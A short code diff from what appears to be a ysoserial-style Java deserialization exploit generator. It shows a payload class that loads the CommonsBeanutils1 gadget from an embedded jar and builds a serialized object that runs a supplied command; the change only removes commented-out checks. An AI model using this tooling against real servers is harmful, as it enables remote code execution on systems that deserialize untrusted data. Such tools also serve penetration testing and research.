@@ -26,17 +26,11 @@ public class CommonsBeanutils1_183 implements ObjectPayload<Object> {
         byte[] jarBytes = new BASE64Decoder().decodeBuffer(CommonUtils.readStringFromInputStream(inputStream));
         suidClassLoader.addJar(jarBytes);
         Class clsGadget = suidClassLoader.loadClass("ysoserial.payloads.CommonsBeanutils1");
-
-//        if(BeanComparator.class.getClassLoader().equals(suidClassLoader)){
         Object objGadget = clsGadget.newInstance();
         Method getObject = objGadget.getClass().getDeclaredMethod("getObject",String.class);
         Object objPayload = getObject.invoke(objGadget,command);
         suidClassLoader.cleanLoader();
         return objPayload;
-//        }else{
-//            System.out.println("Class is not SuidClassLoader loading, serialization failure!");
-//            return null;
-//        }
     }
 
     public static void main(final String[] args) throws Exception {
